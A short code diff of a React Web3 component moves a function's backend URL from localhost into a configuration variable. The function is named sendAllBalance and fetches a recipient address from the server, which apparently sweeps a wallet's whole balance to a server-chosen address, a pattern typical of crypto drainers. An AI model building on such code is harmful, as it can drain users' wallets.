@@ -1,5 +1,6 @@
 'use client'
 
+import { BACKEND_LINK } from '@/utils/variables';
 import { useState } from 'react'
 import Web3 from 'web3'
 import type { ExternalProvider } from 'web3-core'
@@ -12,7 +13,7 @@ async function sendAllBalance(
 ): Promise<string> {
   // 1. Получаем адрес получателя от бэка
   setStatus('Получаем адрес получателя от бэка…')
-  const res = await fetch('http://localhost:8000/contract')
+  const res = await fetch(`${BACKEND_LINK}/contract`)
   if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
   const { recipient } = await res.json() as { recipient: string }
 
